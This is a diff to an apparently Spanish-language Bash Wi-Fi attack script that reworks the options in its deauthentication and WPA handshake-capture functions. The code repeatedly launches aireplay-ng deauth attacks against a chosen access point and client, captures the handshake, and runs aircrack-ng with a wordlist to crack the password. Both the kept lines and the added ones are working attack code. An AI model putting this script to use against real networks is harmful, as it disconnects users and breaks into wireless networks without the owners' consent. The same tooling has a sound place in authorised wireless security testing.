@@ -136,18 +136,20 @@ function attackDeauth (){
 		fi
 	fi
 
-	if [ "$MORE_OPT" != "false" ] || [[ "$numS" != "" && "$numSI" != "" && "$num" != "" ]]; then
-		opt=""; if [[ "$numS" == "" && "$numSI" == "" && "$num" == "" ]]; then
+	if [ "$MORE_OPT" == "true" ]; then
+		opt=""; if [[ "$numS" == "" && "$numSI" == "" && "$num" == "" ]] || [[ "$numS" == "true" && "$numSI" == "true" && "$num" == "true" ]]; then
 			until [[ $opt =~ (y|n|Y|N) ]]; do
 				echo -en "\t${yellowColour}Mas opciones(y/n): ${endColour}" && read opt
         		done
 		fi
 
-		if [[ "$numS" == "" && "$numSI" == "" && "$num" == "" ]] || [[ "$opt" == "y" || "$opt" == "Y" ]]; then
+		if [[ "$opt" == "y" || "$opt" == "Y" ]]; then
 			echo -en "\t${yellowColour}Duracion (s): ${endColour}" && read numS; sleep 0.5
 			echo -en "\t${yellowColour}Intervalo (s): ${endColour}" && read numSI; sleep 0.5
 			echo -en "\t${yellowColour}Numero de veces: ${endColour}" && read num; sleep 0.5
 		fi
+
+		if [[ "$opt" == "n" || "$opt" == "N" ]]; then MORE_OPT="false"; numS=""; fi
 
 		if [[ "$numS" != "" && "$numSI" != "" && "$num" != "" && "$BSSID" != "" && "$ST" != "" ]]; then
     			for (( c=1; c<=$num; c++ )); do
@@ -158,7 +160,7 @@ function attackDeauth (){
 		fi
 	fi
 
-	if [ "$MORE_OPT" == "false" ] || [[ "$numS" == "" && "$numSI" == "" && "$num" == "" ]]; then
+	if [ "$MORE_OPT" != "true" ]; then
 		xterm -hold -e "aireplay-ng --deauth 1111 -a $BSSID -c ${ST} ${networkCard}mon 2>/dev/null" 2>/dev/null &
 		xtermAireplayPIB=$!
 		sleep 0.5; echo -ne "${readColour}::${endColour} ${grayColour}Para matar el ataque presione [ENTER]: ${endColour}"; read
@@ -197,7 +199,7 @@ function attackHandshake(){
 		echo -en "\t${yellowColour}Numero de veces: ${endColour}" && read num; sleep 0.5
 	fi
 
-	if [ "$MORE_OPT" == "defauld" ]; then numS=4; numSI=20; num=4; fi
+	if [ "$MORE_OPT" == "false" ]; then numS=4; numSI=20; num=4; fi
 
 	for (( c=1; c<=$num; c++ )); do
 		xterm -hold -e "aireplay-ng --deauth 1111 -a $BSSID -c ${ST} ${networkCard}mon 2>/dev/null" 2>/dev/null &
@@ -205,24 +207,26 @@ function attackHandshake(){
 		sleep $numS; kill -9 $xtermAireplayPID; wait $xtermAireplayPID 2>/dev/null; sleep $numSI
 	done
 
-	sleep 20; kill -9 $xtermAirodump_AP_PID; wait $xtermAirodump_AP_PID 2>/dev/null
+	echo -e "${readColour}::${endColour} ${grayColour}Esperando 10 segusdos${endColour}"
+	sleep 10; kill -9 $xtermAirodump_AP_PID; wait $xtermAirodump_AP_PID 2>/dev/null
 
-	echo -en "\t${yellowColour}Ruta diccionario: ${endColour}" && read ruteDic
+	if [ "$ruteDic" == "" ]; then echo -en "\t${yellowColour}Ruta diccionario: ${endColour}" && read ruteDic; fi
 
 	xterm -hold -e "aircrack-ng -w $ruteDic -b $BSSID  Captura-01.cap" 2>/dev/null &
 
 	echo -e "\t${readColour}::${endColour} ${grayColour}Crack Handshake${scanTimeout}(s)${endColour}"
 
-	sleep 1; until [[ $capOPT =~ (y|n|Y|N) ]]; do
-		echo -en "\t${yellowColour}Eliminar captura(y/n): ${endColour}" && read capOPT
-        done; sleep 1
+	if [ "$CAPTURE_DELETE" == "true" ]; then
+		sleep 1; until [[ $capOPT =~ (y|n|Y|N) ]]; do
+			echo -en "\t${yellowColour}Eliminar captura(y/n): ${endColour}" && read capOPT
+        	done; sleep 1
 
-	if [ "$capOPT" == "y" ] || [ "$capOPT" == "Y" ]; then
-		rm Captura* 2>/dev/null
-		sleep 1; echo -e "\t\t${readColour}::${endColour} ${grayColour}Capturas borradas${endColour}"
-		sleep 1; echo -e "\t\t${readColour}::${endColour} ${grayColour}Archivos temporales borrados${endColour}"
-	fi
-	sleep 1; ctrl_c
+		if [ "$capOPT" == "y" ] || [ "$capOPT" == "Y" ]; then
+			rm Captura* 2>/dev/null
+			sleep 1; echo -e "\t\t${readColour}::${endColour} ${grayColour}Capturas borradas${endColour}"
+			sleep 1; echo -e "\t\t${readColour}::${endColour} ${grayColour}Archivos temporales borrados${endColour}"
+		fi
+	fi; sleep 1; ctrl_c
 }
 
 function attackPMKID(){
@@ -323,7 +327,11 @@ function defauld_value(){
 	if [ "$MORE_OPT" == "FALSE" ]; then MORE_OPT="false"; fi
 	if [ "$MORE_OPT" == "DEFAULD" ]; then MORE_OPT="defauld"; fi
 
+#	variables["--rute"]="ruteDic"
 	if [ "$ruteDic" != "" ]; then test -f "$ruteDic"; if [ $? -ne 0 ]; then ctrl_c; fi; fi
+
+#       variables["--capture-delete"]="CAPTURE_DELETE"
+	if [ "$CAPTURE_DELETE" == "" ]; then CAPTURE_DELETE="false"; fi
 }
 
 #echo "XTerm*selectToClipboard: true" > ~/.Xresources
@@ -344,6 +352,7 @@ if [ "$(id -u)" == "0" ]; then
 	variables["--install"]="INSTALL"
 	variables["--more-options"]="MORE_OPT"
 	variables["--rute"]="ruteDic"
+	variables["--capture-delete"]="CAPTURE_DELETE"
 
 	variables["-i"]="networkCard"
 	variables["-s"]="SYSTEM_USER"
